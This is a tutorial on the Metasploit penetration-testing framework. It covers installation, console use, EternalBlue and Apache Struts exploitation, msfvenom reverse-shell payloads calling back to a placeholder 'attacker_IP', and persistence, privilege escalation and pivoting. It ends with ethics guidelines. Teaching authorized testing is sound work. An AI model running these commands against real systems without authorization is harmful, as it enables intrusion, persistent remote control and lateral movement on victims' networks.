Introduction to Metasploit Framework

The Metasploit Framework, developed by Rapid7, is one of the most powerful tools for penetration testing, enabling security professionals to exploit vulnerabilities, conduct security assessments, and manage exploitation activities efficiently.

This comprehensive tutorial covers setup, usage, practical exploitation, post-exploitation techniques, troubleshooting, and best practices for ethical penetration testing.

1. Complete Setup Instructions (Linux, Windows, macOS)

Linux (Kali Linux):

- Pre-installed on Kali Linux; update regularly:
```
sudo apt update
sudo apt install metasploit-framework
```

Linux (Ubuntu/Debian):
```
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod +x msfinstall
sudo ./msfinstall
```

Windows:

- Download Metasploit Community/Pro installer from https://www.metasploit.com/download.
- Run installer and follow on-screen instructions.

macOS:
```
brew install metasploit
```

Verify Installation:
```
msfconsole
```

---

2. Metasploit Console Deep Dive

Launching Metasploit:
```
msfconsole
```

Basic Commands:
- `help`: List commands.
- `search exploit_name`: Find exploits.
- `use exploit/windows/smb/ms17_010_eternalblue`: Select exploit.
- `show options`: View settings.
- `set RHOSTS 192.168.1.100`: Set target host.
- `set payload windows/x64/meterpreter/reverse_tcp`: Set payload.
- `exploit`: Launch exploit.

Modules Overview:
- Exploits: Code to exploit vulnerabilities.
- Payloads: Delivered after successful exploit.
- Auxiliary: Scanners, enumeration scripts.
- Encoders: Avoid detection by antivirus.

3. Real-world Exploitation Scenarios

**SMB (EternalBlue)**:
- Vulnerability: MS17-010.
- Exploit:
```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set payload windows/x64/meterpreter/reverse_tcp
set LHOST attacker_IP
exploit
```

**Web Application Exploitation**:
- Example: Exploiting vulnerable Apache Struts:
```
use exploit/multi/http/struts2_content_type_ognl
set RHOSTS target_IP
set TARGETURI /app
set payload linux/x86/meterpreter/reverse_tcp
set LHOST attacker_IP
exploit
```

**Client-Side Exploitation**:
- Generate malicious payload:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_IP LPORT=4444 -f exe > payload.exe
```
- Listener setup:
```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST attacker_IP
set LPORT 4444
exploit
```

4. Payload Creation and Management

Payload Creation with msfvenom:
- Windows reverse shell:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_IP LPORT=4444 -f exe -o shell.exe
```
- Linux reverse shell:
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=attacker_IP LPORT=4444 -f elf -o shell.elf
```

Managing Payload Sessions:
- Session handling:
```
sessions -l
sessions -i 1
```

- Upgrading Shells to Meterpreter:
```
sessions -u 1
```

---

5. Detailed Post-Exploitation Strategies

**Persistence**:
- Scheduled Task (Windows):
```
run persistence -X -i 30 -p 4444 -r attacker_IP
```

**Privilege Escalation**:
- Automated escalation:
```
getsystem
```
- Manual enumeration:
```
run post/multi/recon/local_exploit_suggester
```

**Pivoting (Lateral Movement)**:
- Routing through compromised hosts:
```
run autoroute -s subnet
```

---

6. Troubleshooting Common Issues

- **Connection issues**:
  Ensure no firewall blocks traffic.
- **Payloads not executing**:
  Verify payload compatibility with target OS/architecture.
- **Sessions dropping**:
  Use stable payloads (`meterpreter/reverse_tcp`).

Logs and Debugging:
- Enable verbose mode:
```
set verbose true
```

7. Ethical Hacking Guidelines and Best Practices

- Always have written permission and defined scope.
- Clearly communicate the purpose and time of testing to stakeholders.
- Report all discovered vulnerabilities responsibly.
- Protect sensitive information acquired during tests.
